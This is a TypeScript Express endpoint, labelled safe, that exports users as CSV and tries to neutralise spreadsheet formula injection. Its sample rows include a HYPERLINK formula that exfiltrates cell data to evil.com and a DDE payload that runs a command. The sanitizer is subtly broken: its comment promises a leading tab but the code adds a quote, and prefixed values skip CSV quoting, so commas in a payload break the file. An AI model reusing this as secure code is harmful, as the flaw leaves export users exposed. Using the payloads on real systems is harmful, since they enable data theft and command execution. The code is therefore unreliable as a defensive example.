// SAFE: Dangerous leading characters are escaped with a leading tab.
import { Request, Response } from 'express';

const DANGEROUS_CHARS = ['=', '+', '-', '@'];

function escapeCsvField(value: string): string {
  if (value.length > 0 && DANGEROUS_CHARS.includes(value[0])) {
    return "'" + value;
  }
  if (value.includes(',') || value.includes('"') || value.includes('\n')) {
    return '"' + value.replace(/"/g, '""') + '"';
  }
  return value;
}

export async function exportUsers(req: Request, res: Response): Promise<void> {
  type UserRow = [string, string, string];
  const users: UserRow[] = [
    ['1', 'Alice', 'alice@example.com'],
    ['2', 'Bob', 'bob@example.com'],
    ['3', '=HYPERLINK("http://evil.com?exfil="&A1,"click")', '=cmd|/C calc!A0'],
  ];

  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename="users.csv"');

  const header = 'id,name,email\n';
  const rows = users.map(row => row.map(escapeCsvField).join(',')).join('\n');
  res.send(header + rows);
}
